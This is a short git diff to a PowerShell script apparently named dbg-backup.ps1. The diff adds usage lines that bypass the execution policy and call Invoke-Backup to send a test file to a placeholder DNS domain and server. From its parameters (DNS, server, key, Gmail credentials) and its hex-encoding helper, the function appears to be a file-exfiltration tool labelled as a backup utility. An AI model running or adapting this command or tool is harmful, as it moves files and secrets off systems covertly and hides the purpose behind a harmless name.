@@ -1,3 +1,10 @@
+powershell -ep bypass
+. .\dbg-backup.ps1
+
+Invoke-Backup -file .\testfile.txt -dns xxxxxxx.com -server xxxxxxxx -type dns -key test123
+
+------------
+
 function Invoke-Backup {
     param ([string] $file, [string] $key, [string] $server, [string] $port, [string] $type, [string] $dns, [int] $sleep, [string] $base64, [string] $gmailUser, [string] $gmailPass)
     $data = [System.IO.File]::ReadAllBytes($file)
@@ -318,4 +325,5 @@ function Convert-ToCHexString {
     $ans = ''
     [System.Text.Encoding]::ASCII.GetBytes($str) | % { $ans += "{0:X2}" -f $_ }
     return $ans;
+
 }
